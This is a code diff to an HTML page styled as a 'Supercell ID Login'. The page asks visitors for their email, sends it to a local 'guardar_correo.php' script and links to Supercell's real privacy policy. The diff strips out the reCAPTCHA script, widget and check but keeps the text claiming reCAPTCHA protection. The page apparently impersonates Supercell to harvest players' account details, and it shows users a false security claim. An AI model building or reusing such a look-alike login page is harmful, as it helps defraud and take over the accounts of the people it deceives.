@@ -5,8 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Supercell ID Login</title>
     <link rel="stylesheet" href="registro.css">
-    <!-- Agrega el script de reCAPTCHA -->
-    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
 </head>
 <body>
     <div class="container">
@@ -21,7 +19,6 @@
                 <h2 id="main-text">Continuar como Supercell Store</h2>
                 <p id="sub-text">Escribe tu correo electrónico y te enviaremos un código de confirmación.</p>
                 <input type="email" id="email-input" placeholder="Escribe tu correo electrónico" required>
-                <div class="g-recaptcha" data-sitekey="tu-clave-de-sitio"></div> <!-- reCAPTCHA -->
                 <p class="info-text">
                     Esta página está protegida por reCAPTCHA y se aplican la 
                     <a href="https://supercell.com/en/privacy-policy/es/">Política de Privacidad</a> y los 
@@ -53,13 +50,6 @@
 
             // Obtener el correo
             var email = document.getElementById("email-input").value;
-            var recaptchaResponse = grecaptcha.getResponse();  // Obtener la respuesta de reCAPTCHA
-
-            // Verificar que se haya completado el reCAPTCHA
-            if (!recaptchaResponse) {
-                alert("Por favor, confirma que no eres un robot.");
-                return;
-            }
 
             // Realizar la llamada al servidor
             fetch("guardar_correo.php", {
@@ -67,7 +57,7 @@
                 headers: {
                     "Content-Type": "application/x-www-form-urlencoded",
                 },
-                body: "email=" + encodeURIComponent(email) + "&recaptcha_response=" + encodeURIComponent(recaptchaResponse)
+                body: "email=" + encodeURIComponent(email)
             })
             .then(response => response.json())
             .then(data => {
@@ -108,3 +98,4 @@
     </script>
 </body>
 </html>
+
